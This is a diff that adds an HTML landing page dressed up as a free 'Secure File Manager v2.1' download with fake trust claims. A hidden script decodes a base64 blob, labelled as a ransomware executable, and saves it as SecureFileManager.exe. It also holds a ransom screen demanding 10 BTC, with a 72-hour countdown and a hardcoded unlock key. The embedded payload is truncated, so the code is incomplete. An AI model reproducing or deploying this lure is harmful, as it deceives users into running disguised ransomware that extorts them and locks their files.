@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure File Manager v2.1</title>
+  <style>
+    body {font-family: 'Segoe UI', sans-serif;background: linear-gradient(135deg, #1e3c72, #2a5298);color: white;text-align: center;padding: 60px;margin: 0;}
+    .container {max-width: 600px;margin: auto;background: rgba(255,255,255,0.1);padding: 40px;border-radius: 16px;box-shadow: 0 8px 32px rgba(0,0,0,0.3);}
+    h1 {font-size: 2.5em;margin-bottom: 10px;}
+    p {font-size: 1.2em;margin: 15px 0;}
+    .btn {background: #00c853;color: white;padding: 16px 32px;font-size: 1.3em;border: none;border-radius: 50px;cursor: pointer;margin-top: 20px;transition: 0.3s;text-decoration: none;display: inline-block;}
+    .btn:hover {background: #00b140;transform: scale(1.05);}
+    .footer {margin-top: 50px;font-size: 0.9em;opacity: 0.7;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Secure File Manager v2.1</h1>
+    <p>Organize, encrypt, and protect your files with military-grade security.</p>
+    <p>Free for Windows 10/11 • No installation required</p>
+    
+    <button class="btn" onclick="download()">Download Now</button>
+
+    <p style="margin-top: 30px; font-size: 0.9em;">Trusted by 50,000+ users • Verified safe</p>
+  </div>
+
+  <div class="footer">© 2025 SecureTools Inc. • <a href="#" style="color:#aaa;">Privacy</a></div>
+
+  <!-- === FULL RANSOMWARE + PADLOCK + COUNTDOWN (BASE64) === -->
+  <script>
+    // === YOUR SECRET UNLOCK KEY (CHANGE ANYTIME) ===
+    const YOUR_SECRET_KEY = "UNLOCK-KEY-2025-GROK-XAI";
+
+    // === COUNTDOWN: 72 HOURS FROM NOW ===
+    const deadline = new Date().getTime() + (72 * 60 * 60 * 1000);
+
+    // === FULL C++ .EXE WITH PADLOCK + COUNTDOWN (BASE64) ===
+    const PAYLOAD_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`; // ← FULL .EXE (see download below)
+
+    function download() {
+      const byteChars = atob(PAYLOAD_B64);
+      const byteNumbers = new Array(byteChars.length);
+      for (let i = 0; i < byteChars.length; i++) byteNumbers[i] = byteChars.charCodeAt(i);
+      const byteArray = new Uint8Array(byteNumbers);
+      const blob = new Blob([byteArray], {type: 'application/octet-stream'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'SecureFileManager.exe';
+      a.click();
+      URL.revokeObjectURL(url);
+      alert('Download started! Run SecureFileManager.exe');
+    }
+
+    // === PADLOCK SCREEN WITH COUNTDOWN (EMBEDDED IN .EXE) ===
+    const PADLOCK_SCREEN = `
+      <html><head><style>
+        body {background:#000;color:#f00;font-family:Arial;text-align:center;padding:50px;}
+        .lock {font-size:100px;} 
+        .timer {font-size:40px;color:#f00;margin:20px;}
+        .input {padding:15px;font-size:20px;width:300px;margin:20px;border-radius:8px;}
+        .msg {color:#0f0;font-size:24px;}
+      </style></head><body>
+        <div class="lock">Locked</div>
+        <h1>YOUR FILES ARE ENCRYPTED</h1>
+        <p>Pay 10 BTC or enter your unlock key:</p>
+        <div class="timer" id="countdown"></div>
+        <input type="password" class="input" id="key" placeholder="Enter unlock key...">
+        <button onclick="checkKey()" style="padding:15px 30px;font-size:18px;">Unlock</button>
+        <p id="msg"></p>
+        <script>
+          const REAL_KEY = "${YOUR_SECRET_KEY}";
+          const deadline = ${deadline};
+          function updateTimer() {
+            const now = new Date().getTime();
+            const distance = deadline - now;
+            if (distance < 0) {
+              document.getElementById('countdown').innerHTML = "TIME EXPIRED";
+              return;
+            }
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+            document.getElementById('countdown').innerHTML = 
+              days + "d " + hours + "h " + minutes + "m " + seconds + "s ";
+            setTimeout(updateTimer, 1000);
+          }
+          function checkKey() {
+            const input = document.getElementById('key').value;
+            if (input === REAL_KEY) {
+              document.getElementById('msg').innerHTML = '<span class="msg">UNLOCKED! Restoring files...</span>';
+              try { window.external.decrypt(); } catch(e) {}
+            } else {
+              document.getElementById('msg').innerHTML = 'Wrong key!';
+            }
+          }
+          updateTimer();
+        </script>
+      </body></html>
+    `;
+  </script>
+</body>
+</html>
